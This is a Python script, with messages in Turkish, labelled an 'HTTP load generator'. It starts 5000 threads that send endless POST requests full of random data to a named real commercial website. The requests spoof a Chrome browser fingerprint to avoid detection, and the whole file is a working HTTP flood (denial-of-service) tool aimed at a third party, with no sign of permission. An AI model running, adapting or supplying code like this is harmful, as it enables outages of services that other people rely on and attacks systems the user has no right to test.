import threading
import random
import time
import sys
from datetime import datetime
try:
    from curl_cffi import requests
except ImportError:
    print("[KRİTİK HATA] 'curl_cffi' kütüphanesi bulunamadı.")
    print("[ÇÖZÜM] Lütfen terminale 'pip install -U curl_cffi' komutunu yazarak kütüphaneyi kurun.")
    sys.exit(1)

HEDEF_URL = 'https://www.expressvpn.com/' 
THREAD_SAYISI = 5000 

basarili_istekler = 0
basarisiz_istekler = 0
sayac_kilidi = threading.Lock()

def gorevi_calistir(thread_id):
    """Her thread'in yürüteceği ana istek döngüsü."""
    global basarili_istekler, basarisiz_istekler
    oturum = requests.Session()
    while True:
        try:
            rastgele_veri = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for i in range(512))
            yanit = oturum.post(
                HEDEF_URL,
                impersonate="chrome110",
                data={'payload': rastgele_veri},
                timeout=20
            )
            yanit.raise_for_status()
            with sayac_kilidi:
                basarili_istekler += 1
        except Exception:
            with sayac_kilidi:
                basarisiz_istekler += 1

def durumu_raporla():
    """Her saniye, sayaçların güncel durumunu tek bir satırda raporlar."""
    while True:
        time.sleep(1)
        with sayac_kilidi:
            print(f"\r[DURUM] Başarılı: {basarili_istekler} | Başarısız: {basarisiz_istekler} | Hedef: {HEDEF_URL}", end="", flush=True)

if __name__ == "__main__":
    print("=====================================================")
    print("         HTTP Yük Jeneratörü v3.1 Başlatıldı         ")
    print("=====================================================")
    rapor_thread = threading.Thread(target=durumu_raporla, daemon=True)
    rapor_thread.start()
    threadler = []
    for i in range(THREAD_SAYISI):
        thread = threading.Thread(target=gorevi_calistir, args=(i+1,), daemon=True)
        threadler.append(thread)
        thread.start()
    try:
        for t in threadler:
            t.join()
    except KeyboardInterrupt:
        print("\n[BİLGİ] İşlem kullanıcı tarafından durduruldu.")
        sys.exit(0)
